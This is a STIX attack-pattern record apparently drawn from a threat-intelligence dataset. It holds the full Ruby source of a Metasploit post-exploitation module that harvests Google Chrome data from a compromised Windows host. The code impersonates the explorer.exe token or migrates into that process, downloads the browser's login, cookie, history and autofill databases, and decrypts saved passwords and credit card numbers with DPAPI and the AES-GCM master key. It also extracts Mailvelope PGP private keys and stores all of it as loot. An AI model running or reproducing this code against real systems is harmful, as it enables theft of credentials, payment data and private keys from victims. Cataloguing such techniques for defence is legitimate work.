{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9fedf69e-41ec-4eac-a9e9-0158a4e1fc25",
    "created": "2024-08-14T16:33:05.054082Z",
    "modified": "2024-08-14T16:33:05.054086Z",
    "name": "Windows Gather Google Chrome User Data Enumeration",
    "description": " This module will collect user data from Google Chrome and attempt to decrypt sensitive information.  'License' => MSF_LICENSE 'Platform' => ['win'] 'SessionTypes' => ['meterpreter']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_chrome.rb",
            "external_id": "enum_chrome.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Google Chrome User Data Enumeration',\n        'Description' => %q{\n          This module will collect user data from Google Chrome and attempt to decrypt\n          sensitive information.\n        },\n        'License' => MSF_LICENSE,\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Author' => [\n          'Sven Taute', # Original (Meterpreter script)\n          'sinn3r',     # Metasploit post module\n          'Kx499',      # x64 support\n          'mubix'       # Parse extensions\n        ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_close\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_migrate\n              stdapi_fs_stat\n              stdapi_railgun_api\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getsid\n              stdapi_sys_config_getuid\n              stdapi_sys_config_steal_token\n              stdapi_sys_process_attach\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptBool.new('MIGRATE', [false, 'Automatically migrate to explorer.exe', false]),\n      ]\n    )\n  end\n\n  def extension_mailvelope_parse_key(data)\n    return data.gsub(\"\\x00\", '').tr('[]', '').gsub('\\\\r', '').gsub('\"', '').gsub('\\\\n', \"\\n\")\n  end\n\n  def extension_mailvelope_store_key(name, value)\n    return unless name =~ /(private|public)keys/i\n\n    priv_or_pub = Regexp.last_match(1)\n\n    keys = value.split(',')\n    print_good(\"==> Found #{keys.size} #{priv_or_pub} key(s)!\")\n    keys.each do |key|\n      key_data = extension_mailvelope_parse_key(key)\n      vprint_good(key_data)\n      path = store_loot(\n        \"chrome.mailvelope.#{priv_or_pub}\", 'text/plain', session, key_data, \"#{priv_or_pub}.key\", \"Mailvelope PGP #{priv_or_pub.capitalize} Key\"\n      )\n      print_good(\"==> Saving #{priv_or_pub} key to: #{path}\")\n    end\n  end\n\n  def extension_mailvelope(username, extname)\n    chrome_path = @profiles_path + '\\\\' + username + @data_path + 'Default'\n    maildb_path = chrome_path + \"/Local Storage/chrome-extension_#{extname}_0.localstorage\"\n    if file_exist?(maildb_path) == false\n      print_error('==> Mailvelope database not found')\n      return\n    end\n    print_status('==> Downloading Mailvelope database...')\n    local_path = store_loot('chrome.ext.mailvelope', 'text/plain', session, 'chrome_ext_mailvelope')\n    session.fs.file.download_file(local_path, maildb_path)\n    print_good(\"==> Downloaded to #{local_path}\")\n\n    maildb = SQLite3::Database.new(local_path)\n    columns, *rows = maildb.execute2('select * from ItemTable;')\n    maildb.close\n\n    rows.each do |name, value|\n      extension_mailvelope_store_key(name, value)\n    end\n  end\n\n  def parse_prefs(username, filepath)\n    prefs = ''\n    File.open(filepath, 'rb') do |f|\n      prefs = f.read\n    end\n    results = ActiveSupport::JSON.decode(prefs)\n    if results['extensions']['settings']\n      print_status('Extensions installed: ')\n      results['extensions']['settings'].each do |name, values|\n        next unless values['manifest']\n\n        print_status(\"=> #{values['manifest']['name']}\")\n        if values['manifest']['name'] =~ /mailvelope/i\n          print_good('==> Found Mailvelope extension, extracting PGP keys')\n          extension_mailvelope(username, name)\n        end\n      end\n    end\n  end\n\n  def get_master_key(local_state_path)\n    local_state_data = read_file(local_state_path)\n    local_state = JSON.parse(local_state_data)\n    master_key_base64 = local_state['os_crypt']['encrypted_key']\n    master_key = Rex::Text.decode_base64(master_key_base64)\n    master_key\n  end\n\n  def decrypt_data(data)\n    mem = session.railgun.kernel32.LocalAlloc(0, data.length)['return']\n    return nil if mem == 0\n\n    session.railgun.memwrite(mem, data, data.length)\n\n    if session.arch == ARCH_X86\n      inout_fmt = 'V2'\n    elsif session.arch == ARCH_X64\n      inout_fmt = 'Q2'\n    else\n      fail_with(Failure::NoTarget, \"Session architecture must be either x86 or x64.\")\n    end\n\n    pdatain = [data.length, mem].pack(inout_fmt)\n    ret = session.railgun.crypt32.CryptUnprotectData(pdatain, nil, nil, nil, nil, 0, pdatain.length)\n    len, addr = ret['pDataOut'].unpack(inout_fmt)\n\n    decrypted = len == 0 ? nil : session.railgun.memread(addr, len)\n\n    multi_rail = []\n    multi_rail << ['kernel32', 'LocalFree', [mem]]\n    multi_rail << ['kernel32', 'LocalFree', [addr]] if addr != 0\n    session.railgun.multi(multi_rail)\n\n    decrypted\n  end\n\n  def process_files(username)\n    secrets = ''\n    masterkey = nil\n    decrypt_table = Rex::Text::Table.new(\n      'Header' => 'Decrypted data',\n      'Indent' => 1,\n      'Columns' => ['Name', 'Decrypted Data', 'Origin']\n    )\n\n    @chrome_files.each do |item|\n      if item[:in_file] == 'Preferences'\n        parse_prefs(username, item[:raw_file])\n      end\n\n      next if item[:sql].nil?\n      next if item[:raw_file].nil?\n\n      db = SQLite3::Database.new(item[:raw_file])\n      begin\n        columns, *rows = db.execute2(item[:sql])\n      rescue StandardError\n        next\n      end\n      db.close\n\n      rows.map! do |row|\n        res = Hash[*columns.zip(row).flatten]\n        next unless item[:encrypted_fields] && !session.sys.config.is_system?\n\n        item[:encrypted_fields].each do |field|\n          name = res['name_on_card'].nil? ? res['username_value'] : res['name_on_card']\n          origin = res['label'].nil? ? res['origin_url'] : res['label']\n          enc_data = res[field]\n\n          if enc_data.start_with? 'v10'\n            unless masterkey\n              print_status('Found password encrypted with masterkey')\n              local_state_path = @profiles_path + '\\\\' + username + @data_path + 'Local State'\n              masterkey_encrypted = get_master_key(local_state_path)\n              masterkey = decrypt_data(masterkey_encrypted[5..])\n              print_good('Found masterkey!') if masterkey\n            end\n\n            cipher = OpenSSL::Cipher.new('aes-256-gcm')\n            cipher.decrypt\n            cipher.key = masterkey\n            cipher.iv = enc_data[3..14]\n            ciphertext = enc_data[15..-17]\n            cipher.auth_tag = enc_data[-16..]\n            pass = res[field + '_decrypted'] = cipher.update(ciphertext) + cipher.final\n          else\n            pass = res[field + '_decrypted'] = decrypt_data(enc_data)\n          end\n          next unless !pass.nil? && (pass != '')\n\n          decrypt_table << [name, pass, origin]\n          secret = \"url:#{origin} #{name}:#{pass}\"\n          secrets << secret << \"\\n\"\n          vprint_good(\"Decrypted data: #{secret}\")\n        end\n      end\n    end\n\n    if secrets != ''\n      path = store_loot('chrome.decrypted', 'text/plain', session, decrypt_table.to_s, 'decrypted_chrome_data.txt', 'Decrypted Chrome Data')\n      print_good(\"Decrypted data saved in: #{path}\")\n    end\n  end\n\n  def extract_data(username)\n    # Prepare Chrome's path on remote machine\n    chrome_path = @profiles_path + '\\\\' + username + @data_path + 'Default'\n    raw_files = {}\n\n    @chrome_files.map { |e| e[:in_file] }.uniq.each do |f|\n      remote_path = chrome_path + '\\\\' + f\n\n      # Verify the path before downloading the file\n      if file_exist?(remote_path) == false\n        print_error(\"#{f} not found\")\n        next\n      end\n\n      # Store raw data\n      local_path = store_loot(\"chrome.raw.#{f}\", 'text/plain', session, \"chrome_raw_#{f}\")\n      raw_files[f] = local_path\n      session.fs.file.download_file(local_path, remote_path)\n      print_good(\"Downloaded #{f} to '#{local_path}'\")\n    end\n\n    # Assign raw file paths to @chrome_files\n    raw_files.each_pair do |raw_key, raw_path|\n      @chrome_files.each do |item|\n        if item[:in_file] == raw_key\n          item[:raw_file] = raw_path\n        end\n      end\n    end\n\n    return true\n  end\n\n  def steal_token\n    current_pid = session.sys.process.open.pid\n    target_pid = session.sys.process['explorer.exe']\n    return if target_pid == current_pid\n\n    if target_pid.to_s.empty?\n      print_warning('No explorer.exe process to impersonate.')\n      return\n    end\n\n    print_status(\"Impersonating token: #{target_pid}\")\n    begin\n      session.sys.config.steal_token(target_pid)\n      return true\n    rescue Rex::Post::Meterpreter::RequestError => e\n      print_error(\"Cannot impersonate: #{e.message}\")\n      return false\n    end\n  end\n\n  def migrate(pid = nil)\n    current_pid = session.sys.process.open.pid\n    if !pid.nil? && (current_pid != pid)\n      # PID is specified\n      target_pid = pid\n      print_status(\"current PID is #{current_pid}. Migrating to pid #{target_pid}\")\n      begin\n        session.core.migrate(target_pid)\n      rescue ::Exception => e\n        print_error(e.message)\n        return false\n      end\n    else\n      # No PID specified, assuming to migrate to explorer.exe\n      target_pid = session.sys.process['explorer.exe']\n      if target_pid != current_pid\n        @old_pid = current_pid\n        print_status(\"current PID is #{current_pid}. migrating into explorer.exe, PID=#{target_pid}...\")\n        begin\n          session.core.migrate(target_pid)\n        rescue ::Exception => e\n          print_error(e)\n          return false\n        end\n      end\n    end\n    return true\n  end\n\n  def run\n    @chrome_files = [\n      { raw: '', in_file: 'Web Data', sql: 'select * from autofill;' },\n      { raw: '', in_file: 'Web Data', sql: 'SELECT username_value,origin_url,signon_realm FROM logins;' },\n      { raw: '', in_file: 'Web Data', sql: 'select * from autofill_profiles;' },\n      { raw: '', in_file: 'Web Data', sql: 'select * from credit_cards;', encrypted_fields: ['card_number_encrypted'] },\n      { raw: '', in_file: 'Cookies', sql: 'select * from cookies;' },\n      { raw: '', in_file: 'History', sql: 'select * from urls;' },\n      { raw: '', in_file: 'History', sql: 'SELECT url FROM downloads;' },\n      { raw: '', in_file: 'History', sql: 'SELECT term FROM keyword_search_terms;' },\n      { raw: '', in_file: 'Login Data', sql: 'select * from logins;', encrypted_fields: ['password_value'] },\n      { raw: '', in_file: 'Bookmarks', sql: nil },\n      { raw: '', in_file: 'Preferences', sql: nil },\n    ]\n\n    @old_pid = nil\n    migrate_success = false\n\n    # If we can impersonate a token, we use that first.\n    # If we can't, we'll try to MIGRATE (more aggressive) if the user wants to\n    got_token = steal_token\n    if !got_token && datastore['MIGRATE']\n      migrate_success = migrate\n    end\n\n    host = session.session_host\n\n    # Get Google Chrome user data path\n    env_vars = session.sys.config.getenvs('SYSTEMDRIVE', 'USERNAME')\n    sysdrive = env_vars['SYSTEMDRIVE'].strip\n    if directory?(\"#{sysdrive}\\\\Users\")\n      @profiles_path = \"#{sysdrive}/Users\"\n      @data_path = '\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\'\n    elsif directory?(\"#{sysdrive}\\\\Documents and Settings\")\n      @profiles_path = \"#{sysdrive}/Documents and Settings\"\n      @data_path = '\\\\Local Settings\\\\Application Data\\\\Google\\\\Chrome\\\\User Data\\\\'\n    end\n\n    # Get user(s)\n    usernames = []\n    if is_system?\n      print_status('Running as SYSTEM, extracting user list...')\n      print_warning('(Automatic decryption will not be possible. You might want to manually migrate, or set \"MIGRATE=true\")')\n      session.fs.dir.foreach(@profiles_path) do |u|\n        not_actually_users = [\n          '.', '..', 'All Users', 'Default', 'Default User', 'Public', 'desktop.ini',\n          'LocalService', 'NetworkService'\n        ]\n        usernames << u unless not_actually_users.include?(u)\n      end\n      print_status \"Users found: #{usernames.join(', ')}\"\n    else\n      uid = session.sys.config.getuid\n      print_status \"Running as user '#{uid}'...\"\n      usernames << env_vars['USERNAME'].strip if env_vars['USERNAME']\n    end\n\n    has_sqlite3 = true\n    begin\n      require 'sqlite3'\n    rescue LoadError\n      print_warning('SQLite3 is not available, and we are not able to parse the database.')\n      has_sqlite3 = false\n    end\n\n    # Process files for each username\n    usernames.each do |u|\n      print_status(\"Extracting data for user '#{u}'...\")\n      success = extract_data(u)\n      process_files(u) if success && has_sqlite3\n    end\n\n    # Migrate back to the original process\n    if datastore['MIGRATE'] && @old_pid && migrate_success\n      print_status('Migrating back...')\n      migrate(@old_pid)\n    end\n  end\nend\n"
}